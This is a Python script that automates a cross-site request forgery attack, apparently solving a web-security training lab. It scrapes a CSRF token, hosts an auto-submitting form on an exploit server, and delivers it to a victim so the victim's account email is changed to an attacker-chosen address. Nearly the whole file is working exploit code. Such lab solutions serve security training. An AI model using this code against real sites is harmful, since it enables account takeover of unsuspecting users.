import random
import time
import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]

session = requests.Session()

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)
email_random = f"aaa{random.randint(0, 9999):04}&#64;aaaaaaaa&#46;com"

response_csrf = session.get(burp_url+'/my-account')
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_csrf.text)
csrf = csrf_token_match.group(1)

exploit_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<html><body><form action=\"{burp_url}/my-account/change-email\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"email\" value=\"{email_random}\" />\r\n      <input type=\"hidden\" name=\"csrf\" value=\"{csrf}\" />\r\n    </form>\r\n    <script>\r\n      document.forms[0].submit();\r\n    </script></body></html>", "formAction": "STORE"}


session.post(exploit_server, data=exploit_data)
burp_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8", "Accept-Language": "pl,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://exploit-0adb006b04bf60848107bf9e01030060.exploit-server.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
session.get(exploit_server+'/deliver-to-victim',headers=burp_headers)
print("this task is broken and sometimes doesn't score the answer")

